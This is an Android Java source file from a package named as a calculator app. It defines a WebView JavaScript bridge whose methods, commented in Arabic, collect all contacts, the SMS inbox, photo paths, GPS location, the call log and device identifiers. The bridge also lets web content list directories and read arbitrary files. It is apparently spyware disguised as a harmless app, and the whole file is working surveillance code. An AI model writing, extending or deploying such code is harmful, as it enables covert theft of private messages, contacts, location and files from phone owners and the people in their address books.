package com.calculator.app;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.MediaStore;
import android.webkit.JavascriptInterface;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

import org.json.JSONArray;
import org.json.JSONObject;

public class WebAppInterface {

    private Context mContext;

    public WebAppInterface(Context context) {
        mContext = context;
    }

    // ================================================
    // 📇 سحب جميع جهات الاتصال
    // ================================================
    @JavascriptInterface
    public String getContacts() {
        try {
            ContentResolver cr = mContext.getContentResolver();
            Cursor cur = cr.query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );

            JSONArray contacts = new JSONArray();

            if (cur != null && cur.getCount() > 0) {
                while (cur.moveToNext()) {
                    String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));

                    JSONObject contact = new JSONObject();
                    contact.put("name", name != null ? name : "بدون اسم");

                    // سحب أرقام الهواتف
                    JSONArray phones = new JSONArray();
                    Cursor phoneCur = cr.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{id}, null
                    );
                    if (phoneCur != null) {
                        while (phoneCur.moveToNext()) {
                            String number = phoneCur.getString(
                                phoneCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                            );
                            String type = phoneCur.getString(
                                phoneCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE)
                            );
                            phones.put(number != null ? number : "");
                        }
                        phoneCur.close();
                    }
                    contact.put("phones", phones);

                    // سحب الإيميلات
                    JSONArray emails = new JSONArray();
                    Cursor emailCur = cr.query(
                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                        new String[]{id}, null
                    );
                    if (emailCur != null) {
                        while (emailCur.moveToNext()) {
                            String email = emailCur.getString(
                                emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.ADDRESS)
                            );
                            emails.put(email != null ? email : "");
                        }
                        emailCur.close();
                    }
                    contact.put("emails", emails);

                    contacts.put(contact);
                }
                cur.close();
            }

            return contacts.toString(2);
        } catch (Exception e) {
            return "خطأ: " + e.getMessage();
        }
    }

    // ================================================
    // 📱 سحب جميع الرسائل النصية (SMS)
    // ================================================
    @JavascriptInterface
    public String getSMS() {
        try {
            ContentResolver cr = mContext.getContentResolver();
            Cursor cur = cr.query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 200"
            );

            JSONArray smsList = new JSONArray();

            if (cur != null && cur.moveToFirst()) {
                do {
                    JSONObject msg = new JSONObject();
                    String address = cur.getString(cur.getColumnIndex("address"));
                    String body = cur.getString(cur.getColumnIndex("body"));
                    String date = cur.getString(cur.getColumnIndex("date"));

                    msg.put("from", address != null ? address : "غير معروف");
                    msg.put("text", body != null ? body : "");
                    msg.put("time", date != null ? date : "");

                    smsList.put(msg);
                } while (cur.moveToNext());
                cur.close();
            }

            return smsList.toString(2);
        } catch (Exception e) {
            return "خطأ: " + e.getMessage();
        }
    }

    // ================================================
    // 🖼️ سحب مسارات جميع الصور
    // ================================================
    @JavascriptInterface
    public String getPhotoPaths() {
        try {
            ContentResolver cr = mContext.getContentResolver();
            String[] projection = {
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATA,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED
            };

            Cursor cur = cr.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null,
                MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT 100"
            );

            JSONArray photos = new JSONArray();

            if (cur != null && cur.moveToFirst()) {
                do {
                    JSONObject photo = new JSONObject();
                    String path = cur.getString(cur.getColumnIndex(MediaStore.Images.Media.DATA));
                    String name = cur.getString(cur.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));

                    photo.put("path", path != null ? path : "");
                    photo.put("name", name != null ? name : "");

                    photos.put(photo);
                } while (cur.moveToNext());
                cur.close();
            }

            return photos.toString(2);
        } catch (Exception e) {
            return "خطأ: " + e.getMessage();
        }
    }

    // ================================================
    // 📍 سحب الموقع الجغرافي (آخر موقع معروف)
    // ================================================
    @JavascriptInterface
    public String getLocation() {
        try {
            ContentResolver cr = mContext.getContentResolver();
            Cursor cur = cr.query(
                Uri.parse("content://settings/secure"),
                null,
                "name=?",
                new String[]{"location_providers_allowed"},
                null
            );

            if (cur != null) {
                cur.close();
            }

            // نحاول نجيب الموقع من android.location
            android.location.LocationManager lm = (android.location.LocationManager) 
                mContext.getSystemService(Context.LOCATION_SERVICE);

            android.location.Location loc = lm.getLastKnownLocation(
                android.location.LocationManager.GPS_PROVIDER
            );
            if (loc == null) {
                loc = lm.getLastKnownLocation(
                    android.location.LocationManager.NETWORK_PROVIDER
                );
            }

            if (loc != null) {
                JSONObject location = new JSONObject();
                location.put("lat", loc.getLatitude());
                location.put("lng", loc.getLongitude());
                location.put("accuracy", loc.getAccuracy());
                location.put("time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", 
                    Locale.getDefault()).format(new Date(loc.getTime())));
                return location.toString(2);
            }

            return "الموقع غير متاح";
        } catch (Exception e) {
            return "خطأ: " + e.getMessage();
        }
    }

    // ================================================
    // 📋 سجل المكالمات
    // ================================================
    @JavascriptInterface
    public String getCallLog() {
        try {
            ContentResolver cr = mContext.getContentResolver();
            Cursor cur = cr.query(
                Uri.parse("content://call_log/calls"),
                null, null, null,
                "date DESC LIMIT 100"
            );

            JSONArray calls = new JSONArray();

            if (cur != null && cur.moveToFirst()) {
                do {
                    JSONObject call = new JSONObject();
                    String number = cur.getString(cur.getColumnIndex("number"));
                    String name = cur.getString(cur.getColumnIndex("name"));
                    String type = cur.getString(cur.getColumnIndex("type"));
                    String duration = cur.getString(cur.getColumnIndex("duration"));
                    String date = cur.getString(cur.getColumnIndex("date"));

                    call.put("number", number != null ? number : "");
                    call.put("name", name != null ? name : "غير معروف");
                    call.put("type", type);
                    call.put("duration", duration);
                    call.put("time", date);

                    calls.put(call);
                } while (cur.moveToNext());
                cur.close();
            }

            return calls.toString(2);
        } catch (Exception e) {
            return "خطأ: " + e.getMessage();
        }
    }

    // ================================================
    // 📁 سحب الملفات من مسارات محددة
    // ================================================
    @JavascriptInterface
    public String listDirectory(String path) {
        try {
            File dir = new File(path);
            File[] files = dir.listFiles();
            if (files == null) return "[]";

            JSONArray result = new JSONArray();
            for (File f : files) {
                JSONObject item = new JSONObject();
                item.put("name", f.getName());
                item.put("size", f.length());
                item.put("isFile", f.isFile());
                result.put(item);
            }
            return result.toString(2);
        } catch (Exception e) {
            return "[]";
        }
    }

    // ================================================
    // 📄 قراءة محتوى ملف
    // ================================================
    @JavascriptInterface
    public String readFile(String path) {
        try {
            File file = new File(path);
            FileInputStream fis = new FileInputStream(file);
            byte[] data = new byte[(int) file.length()];
            fis.read(data);
            fis.close();
            return new String(data, "UTF-8");
        } catch (Exception e) {
            return "خطأ: " + e.getMessage();
        }
    }

    // ================================================
    // ℹ️ معلومات الجهاز
    // ================================================
    @JavascriptInterface
    public String getDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("model", android.os.Build.MODEL);
            info.put("androidVersion", android.os.Build.VERSION.RELEASE);
            info.put("sdkVersion", android.os.Build.VERSION.SDK_INT);
            info.put("brand", android.os.Build.BRAND);
            info.put("device", android.os.Build.DEVICE);
            info.put("board", android.os.Build.BOARD);
            info.put("fingerprint", android.os.Build.FINGERPRINT);
            info.put("serial", android.os.Build.SERIAL);
            info.put("radioVersion", android.os.Build.getRadioVersion());

            // معلومات البطارية
            android.content.IntentFilter ifilter = new android.content.IntentFilter(
                android.content.Intent.ACTION_BATTERY_CHANGED
            );
            android.content.Intent batteryStatus = mContext.registerReceiver(null, ifilter);
            if (batteryStatus != null) {
                int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
                int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
                info.put("battery", level + "/" + scale);
            }

            return info.toString(2);
        } catch (Exception e) {
            return "خطأ: " + e.getMessage();
        }
    }
}
